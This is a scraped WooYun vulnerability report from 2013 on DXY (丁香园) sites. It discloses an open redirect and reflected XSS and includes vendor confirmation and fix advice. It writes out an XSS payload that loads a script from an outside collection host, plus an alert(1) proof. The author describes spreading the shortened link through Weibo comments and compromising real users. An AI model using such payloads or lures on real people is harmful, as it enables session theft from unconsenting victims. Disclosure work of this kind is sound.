{"id": 13332, "wybug_id": "wooyun-2013-019684", "wybug_title": "丁香园漏洞小礼包（含过程，反射性xss利用技巧）", "wybug_corp": "丁香园", "wybug_author": "梧桐雨", "wybug_date": "2013-03-07 15:46", "wybug_open_date": "2013-04-21 15:46", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-21：\t细节向公众公开  简要描述： 丁香园几个小礼包，xss+url跳转 详细说明：  http://paper.pubmed.cn/do.php?ac=login&rfu=http://paper.pubmed.cn/   rfu对地址未验证http://paper.pubmed.cn/do.php?ac=login&rfu=(可构造任意链接进行跳转)主要还是说说xss吧，没说明，一个礼包- -剑心还是不给过。这次我还是和上次一样。来一个利用吧。我选中了http://www.jobmd.cn/article站点的搜索处的XSS进行测试。之前提交过，但是没过程未过，这次我想了下，本想选择在论坛处通过发帖的形式传播一下。但是新注册，不能通过邀请，但是又不想手机注册，那怎么办呢？我忽然想到了一个好的idea，就是通过@fenng的微博作为一个跳板（大辉哥微博是很多人看的哟，因此这里头肯定会有人是登录了丁香园帐号的。）构造好代码：http://www.jobmd.cn/article/search.htm?keywords=%3C%2Ftitle%3E%3Cscript+src%3D%22http%3A%2F%2Fxss.ezsec.org%2F%3Fu%3Df71717%22+%3E%3C%2Fscript%3E&category=-1&action=Search&action_search=这个时候还是太长了，我们通过url.cn转下，让他变得更加简洁：http://url.cn/E273r7 然后通过小微博号发布到fenng的微博评论上。（带一点儿社工的性质）\n\n没有多久，就有几个用户中招了。\n\n   漏洞证明：  获取到的信息：\n\n\n\n危害证明，反射XSS用得好，一样可以造成很大的危害~还有一处也有xss，顺便也发了，这个也是你们旗下的，还在内测中，好好修复下吧http://pubmed.cn/index.php?st=\"><script>alert(1)</script>  首页反射型XSSst参数没有过滤好。   修复方案：  修复建议：url跳转:referer的限制下，加入有效性验证Token。xss:过滤关键的地方，标题也别漏了。安全是一个整体，不是一个部分。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-03-07 15:50 厂商回复： 感谢梧桐雨的工作。火速修正中...  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-22 02:06 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  你把修复csrf方式放在了修复url跳转里了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}